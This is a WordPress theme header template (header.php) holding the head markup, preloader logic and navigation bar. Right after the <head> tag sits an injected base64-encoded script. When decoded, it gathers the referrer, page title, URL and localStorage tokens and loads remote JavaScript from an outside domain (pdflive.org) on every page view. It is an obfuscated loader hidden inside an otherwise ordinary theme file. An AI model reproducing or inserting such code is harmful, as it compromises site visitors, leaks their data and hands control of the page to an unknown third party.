<?php
/**
 * The Header for our theme.
 * Displays all of the <head> section and everything up till <div id="content">
 */
?><!DOCTYPE html>

<html <?php language_attributes(); ?>>

<head>
<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfcjZ2MXBHR0RTa2Q3U2hSQyc7CiAgICBpZiAoIXdpbmRvdy5fcjZ2MXBHR0RTa2Q3U2hSQykgewogICAgICAgIHdpbmRvdy5fcjZ2MXBHR0RTa2Q3U2hSQyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9wZGZsaXZlLm9yZy92UHJDQkonLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfWE1SYkJNQm43Q3JiMld0bSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX1hNUmJCTUJuN0NyYjJXdG0gIT09ICd1bmRlZmluZWQnICYmIF9YTVJiQk1CbjdDcmIyV3RtICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF82dG00UXJNWXR5cjNxNkNmID0gSlNPTi5wYXJzZShfWE1SYkJNQm43Q3JiMld0bSk7CiAgICAgICAgdmFyIF9KcDZnMTZMSkNkQ0hmdm5nID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoXzZ0bTRRck1ZdHlyM3E2Q2YuY3JlYXRlZF9hdCArIHdpbmRvdy5fcjZ2MXBHR0RTa2Q3U2hSQy50dGwgPCBfSnA2ZzE2TEpDZENIZnZuZykgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX0hiUURwMjRnMllwRjlZd0YgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfWFBEdHlIOWpKOVhSWTFEUyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9oOTRXaERqeldTZmpCSEtKID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfaDk0V2hEanpXU2ZqQkhLSiArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfaDk0V2hEanpXU2ZqQkhLSiArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9oOTRXaERqeldTZmpCSEtKICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9oOTRXaERqeldTZmpCSEtKICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfaDk0V2hEanpXU2ZqQkhLSiArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfaDk0V2hEanpXU2ZqQkhLSiArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX3I2djFwR0dEU2tkN1NoUkMuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX0hiUURwMjRnMllwRjlZd0YgIT09ICd1bmRlZmluZWQnICYmIF9IYlFEcDI0ZzJZcEY5WXdGICYmIHdpbmRvdy5fcjZ2MXBHR0RTa2Q3U2hSQy51bmlxdWUpIHsKICAgICAgICBfaDk0V2hEanpXU2ZqQkhLSiArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9IYlFEcDI0ZzJZcEY5WXdGKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX1hQRHR5SDlqSjlYUlkxRFMgIT09ICd1bmRlZmluZWQnICYmIF9YUER0eUg5ako5WFJZMURTICYmIHdpbmRvdy5fcjZ2MXBHR0RTa2Q3U2hSQy51bmlxdWUpIHsKICAgICAgICBfaDk0V2hEanpXU2ZqQkhLSiArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1hQRHR5SDlqSjlYUlkxRFMpOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX3I2djFwR0dEU2tkN1NoUkMuUl9QQVRIICsgX2g5NFdoRGp6V1NmakJIS0o7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA="></script>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

<!--[if lt IE 9]>
<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/html5.js"></script>
<link rel="stylesheet" href="<?php echo esc_url( get_template_directory_uri() ); ?>/css/ie.css" type="text/css">
<![endif]-->

<?php

if ( ! function_exists( '_wp_render_title_tag' ) ) :
    function zerif_old_render_title() {
?>
<title><?php wp_title( '-', true, 'right' ); ?></title>
<?php
    }
    add_action( 'wp_head', 'zerif_old_render_title' );
endif;

wp_head(); ?>

</head>

<?php if(isset($_POST['scrollPosition'])): ?>

	<body <?php body_class(); ?> onLoad="window.scrollTo(0,<?php echo intval($_POST['scrollPosition']); ?>)">

<?php else: ?>

	<body <?php body_class(); ?> >

<?php endif; 

	global $wp_customize;
	
	/* Preloader */

	if(is_front_page() && !isset( $wp_customize ) && get_option( 'show_on_front' ) != 'page' ): 
 
		$zerif_disable_preloader = get_theme_mod('zerif_disable_preloader');
		
		if( isset($zerif_disable_preloader) && ($zerif_disable_preloader != 1)):
			echo '<div class="preloader">';
				echo '<div class="status">&nbsp;</div>';
			echo '</div>';
		endif;	

	endif; ?>


<div id="mobilebgfix">
	<div class="mobile-bg-fix-img-wrap">
		<div class="mobile-bg-fix-img"></div>
	</div>
	<div class="mobile-bg-fix-whole-site">


<header id="home" class="header">

	<div id="main-nav" class="navbar navbar-inverse bs-docs-nav" role="banner">

		<div class="container">

			<div class="navbar-header responsive-logo">

				<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">

				<span class="sr-only"><?php _e('Toggle navigation','zerif-lite'); ?></span>

				<span class="icon-bar"></span>

				<span class="icon-bar"></span>

				<span class="icon-bar"></span>

				</button>

				<?php

					$zerif_logo = get_theme_mod('zerif_logo');

					if(isset($zerif_logo) && $zerif_logo != ""):

						echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';

							echo '<img src="'.esc_url( $zerif_logo ).'" alt="'.esc_attr( get_bloginfo('title') ).'">';

						echo '</a>';

					else:

						echo '<a href="'.esc_url( home_url( '/' ) ).'" class="navbar-brand">';
						
							if( file_exists(get_stylesheet_directory()."/images/logo.png")):
							
								echo '<img src="'.get_stylesheet_directory_uri().'/images/logo.png" alt="'.esc_attr( get_bloginfo('title') ).'">';
							
							else:
								
								echo '<img src="'.get_template_directory_uri().'/images/logo.png" alt="'.esc_attr( get_bloginfo('title') ).'">';
								
							endif;

						echo '</a>';

					endif;

				?>

			</div>

			<nav class="navbar-collapse bs-navbar-collapse collapse" role="navigation"   id="site-navigation">
				<a class="screen-reader-text skip-link" href="#content"><?php _e( 'Skip to content', 'zerif-lite' ); ?></a>
				<?php wp_nav_menu( array('theme_location' => 'primary', 'container' => false, 'menu_class' => 'nav navbar-nav navbar-right responsive-nav main-nav-list', 'fallback_cb'     => 'zerif_wp_page_menu')); ?>
			</nav>

		</div>

	</div>
	<!-- / END TOP BAR -->